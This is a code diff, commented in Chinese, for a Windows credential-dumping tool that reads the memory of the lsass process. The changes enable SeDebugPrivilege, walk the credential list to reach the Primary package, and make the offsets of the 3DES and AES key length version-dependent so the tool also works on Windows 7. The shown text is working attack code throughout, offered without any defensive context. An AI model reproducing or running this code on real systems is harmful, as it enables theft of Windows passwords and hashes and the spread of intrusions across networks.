@@ -8,6 +8,39 @@
 
 
 
+bool EnableDebugPrivilege()
+{
+    HANDLE tokenHandle;
+    TOKEN_PRIVILEGES tokenPrivileges;
+    LUID luid;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
+    {
+       // std::cout << "Failed to open process token. Error: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
+    {
+       // std::cout << "Failed to lookup privilege value. Error: " << GetLastError() << std::endl;
+        CloseHandle(tokenHandle);
+        return false;
+    }
+
+    tokenPrivileges.PrivilegeCount = 1;
+    tokenPrivileges.Privileges[0].Luid = luid;
+    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
+    {
+      // 、、 std::cout << "Failed to adjust token privileges. Error: " << GetLastError() << std::endl;
+        CloseHandle(tokenHandle);
+        return false;
+    }
+
+    CloseHandle(tokenHandle);
+    return true;
+}
 
 
 
@@ -262,6 +295,7 @@ inline bool _compare_lsasrv_name(char* dll_name) {
 
 
 int main() {
+    EnableDebugPrivilege();
     DWORD _offset_table[TABLE_LENGTH][4] = {
         {0x32BC3,0x39E5C,0x9E36E,0x108},
         {0x1FA63,0x395DC,0x8CA6C,0x108}
@@ -438,7 +472,7 @@ int main() {
 
 
      DWORD64 _credential_offset =
-         _return_hex_value(stack_string[8 + 8 + 10]) << 28;
+         _return_hex_value(stack_string[8 + 8 + 8 + 10]) << 28;
      _credential_offset +=
          _return_hex_value(stack_string[8 + 8 + 8 + 11]) << 24;
      _credential_offset +=
@@ -454,6 +488,11 @@ int main() {
      _credential_offset +=
          _return_hex_value(stack_string[8 + 8 + 8 + 17]);
 
+     // 长度的偏移很小，2byte足够了
+     WORD _3des_aes_len_offset =
+         _return_hex_value(stack_string[8 + 8 + 8 + 8 + 10]) << 4;
+     _3des_aes_len_offset +=
+         _return_hex_value(stack_string[8 + 8 + 8 + 8 + 11]);
 
     // DWORD _3des_key_offset = _offset_table[_index][1];
     // DWORD _aes_key_offset = _offset_table[_index][2];
@@ -599,6 +638,35 @@ int main() {
         
         // 将该指针重新解释为DWORD64并取值
         DWORD64 _credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));
+        // _credential_addr是一个单链表的头地址，里面可能会有多个节点，每个节点都有一个packageID
+        // 而我们只想要Primary，也就是packageid为3的那个节点，节点地址+8取出dword就是packageid
+        // 如果取出的packageid不是3，我们就继续往后遍历
+        while (1) {
+            // 获取packageID
+            SecureZeroMemory(stack_string, 50);
+            if (!NT_ReadProcessMemory(_lsass_handle, reinterpret_cast<void*>(_credential_addr +8), (void*)stack_string, 8, &bytesRead)) {
+                break; continue;
+            }
+            DWORD _package_id = *(reinterpret_cast<DWORD*>(stack_string));
+            if (3 == _package_id) {
+                // 命中我们的目标节点
+                // 此时_credential_addr就是正确的节点的地址，我们这里直接break即可
+                break;
+            }
+            else {
+                // 往后遍历
+                SecureZeroMemory(stack_string, 50);
+                // 获取下一个节点的地址
+                if (!NT_ReadProcessMemory(_lsass_handle, reinterpret_cast<void*>(_credential_addr), (void*)stack_string, 8, &bytesRead)) {
+                    break; continue;
+                }
+                _credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));
+                // 判断是否达到了尾部
+                if (0 == _credential_addr)break;
+            }
+        }
+
+
         // 这个地址是一个结构体，+0x10偏移量就是密文的地址
         SecureZeroMemory(stack_string, 50);
         bytesRead = 0;
@@ -730,7 +798,9 @@ int main() {
     DWORD64 _3_3des_addr = *(reinterpret_cast<DWORD64*>(stack_string));
     // 读取长度
     SecureZeroMemory(stack_string, 50);
-    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_3des_addr + 0x38)), (void*)stack_string, 4, &bytesRead);
+    // 对于windows7系列，有所不同，长度的位置是0x18而不是0x38
+    // 因此我们把这里修改为一个变量，通过前面的计算进行赋值
+    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_3des_addr + _3des_aes_len_offset)), (void*)stack_string, 4, &bytesRead);
     DWORD _3des_len = *(reinterpret_cast<DWORD*>(stack_string));
 
 
@@ -754,7 +824,7 @@ int main() {
     }
 
     SecureZeroMemory(stack_string, 50);
-    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_3des_addr + 0x38 + 4)), (void*)stack_string, _3des_len, &bytesRead);
+    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_3des_addr + _3des_aes_len_offset + 4)), (void*)stack_string, _3des_len, &bytesRead);
 
     BYTE byteArray[4];
     // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
@@ -799,7 +869,7 @@ int main() {
     DWORD64 _3_aes_addr = *(reinterpret_cast<DWORD64*>(stack_string));
     // 读取长度
     SecureZeroMemory(stack_string, 50);
-    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_aes_addr + 0x38)), (void*)stack_string, 4, &bytesRead);
+    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_aes_addr + _3des_aes_len_offset)), (void*)stack_string, 4, &bytesRead);
     DWORD _aes_len = *(reinterpret_cast<DWORD*>(stack_string));
 
 
@@ -824,7 +894,7 @@ int main() {
     }
 
     SecureZeroMemory(stack_string, 50);
-    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_aes_addr + 0x38 + 4)), (void*)stack_string, _aes_len, &bytesRead);
+    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_aes_addr + _3des_aes_len_offset + 4)), (void*)stack_string, _aes_len, &bytesRead);
     // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
     byteArray[0] = (BYTE)(_aes_len & 0xFF);         // Low byte
     byteArray[1] = (BYTE)((_aes_len >> 8) & 0xFF);  // High byte
